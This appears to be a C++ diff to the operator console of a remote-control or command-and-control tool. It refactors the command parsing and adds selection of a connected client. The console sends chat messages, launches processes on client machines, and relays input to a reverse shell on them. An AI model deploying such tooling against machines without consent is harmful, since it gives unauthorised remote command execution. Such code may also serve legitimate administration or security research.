@@ -25,9 +25,9 @@ Entrypoint::Entrypoint()
 			{
 				_commands[_command]();
 			}
-			catch(...)
+			catch(const std::exception& e)
 			{
-				Trace("Failed to execute command");
+				Trace("Failed to execute command.\n%s\n", e.what());
 			}
 		}
 		else
@@ -43,85 +43,68 @@ void Entrypoint::Startup()
 {
 	_commands["c"] = [this] { SendChatMessage(); };
 	_commands["chat"] = [this] { SendChatMessage(); };
+
 	_commands["p"] = [this] { SendCreateProcess(); };
 	_commands["process"] = [this] { SendCreateProcess(); };
+
 	_commands["r"] = [this] { SendReverseShell(); };
 	_commands["reverse"] = [this] { SendReverseShell(); };
+
 	_commands["l"] = [this] { ListClients(); };
 	_commands["list"] = [this] { ListClients(); };
+
+	_commands["s"] = [this] { SelectClient(); };
+	_commands["select"] = [this] { SelectClient(); };
 
 	Trace("> ");
 }
 
-void Entrypoint::SendChatMessage()
+void Entrypoint::SendChatMessage() const
 {
-	const int pos = _args.find(' ');
+	ValidateSelection();
 
-	auto str = _args.substr(0, pos);
-	const int client = std::stoi(str);
-	std::string message = _args.substr(pos + 1);
-
-	_manager->Send(
-		client,
+	int result = _manager->Send(
+		*_client,
 		MessageType::Chat,
-		std::span(const_cast<char*>(
-			          message.c_str()),
-		          message.size()));
+		_argsSpan);
 }
 
-void Entrypoint::SendCreateProcess()
+void Entrypoint::SendCreateProcess() const
 {
-	const int pos = _args.find(' ');
+	ValidateSelection();
 
-	auto str = _args.substr(0, pos);
-	const int client = std::stoi(str);
-	std::string message = _args.substr(pos + 1);
-
-	_manager->Send(
-		client,
+	int result = _manager->Send(
+		*_client,
 		MessageType::CreateProcessS,
-		std::span(const_cast<char*>(
-			message.c_str()),
-			message.size()));
+		_argsSpan);
 }
 
 void Entrypoint::SendReverseShell()
 {
-	const int pos = _args.find(' ');
+	ValidateSelection();
 
-	auto str = _args.substr(0, pos);
-	const int client = std::stoi(str);
-	std::string message = _args.substr(pos + 1);
-
-	_manager->Send(
-		client,
+	int result = _manager->Send(
+		*_client,
 		MessageType::StartReverseShell,
-		std::span(const_cast<char*>(
-			message.c_str()),
-			message.size()));
+		_argsSpan);
 
 	while (true)
 	{
-		std::string input;
-		std::getline(std::cin, input);
+		ParseInput();
 
-		if (input == "exit")
+		if (_command == "exit")
 		{
-			_manager->Send(
-				client,
+			result = _manager->Send(
+				*_client,
 				MessageType::StopReverseShell,
-				std::span(const_cast<char*>(
-					input.c_str()),
-					input.size()));
+				_commandSpan);
 			break;
 		}
 
-		_manager->Send(
-			client,
+		result = _manager->Send(
+			*_client,
 			MessageType::ReverseShellMessage,
-			std::span(const_cast<char*>(
-				input.c_str()),
-				input.size()));
+			_commandSpan);
 	}
 }
 
@@ -135,6 +118,25 @@ void Entrypoint::ListClients() const
 	}
 }
 
+void Entrypoint::SelectClient()
+{
+	if (_args.empty())
+	{
+		if (_client == nullptr)
+		{
+			throw std::runtime_error("Supply client to select!");
+		}
+	}
+	else
+	{
+		_client = std::make_unique<int>(std::stoi(_args));
+	}
+
+	const auto clientPipe = _manager->GetClients()[*_client];
+
+	Trace("Selected client %d: %s\n", *_client, clientPipe->GetConnection()->GetAddress().c_str());
+}
+
 void Entrypoint::ParseInput()
 {
 	std::string input;
@@ -143,5 +145,19 @@ void Entrypoint::ParseInput()
 	const int pos = input.find(' ');
 
 	_command = input.substr(0, pos);
-	_args = input.substr(pos + 1);
+	_commandSpan = std::span(const_cast<char*>(_command.c_str()), _command.size());
+
+	pos == -1
+		? _args = ""
+		: _args = input.substr(pos + 1);
+
+	_argsSpan = std::span(const_cast<char*>(_args.c_str()), _args.size());
+}
+
+void Entrypoint::ValidateSelection() const
+{
+	if (_client == nullptr)
+	{
+		throw std::runtime_error("No client selected!");
+	}
 }
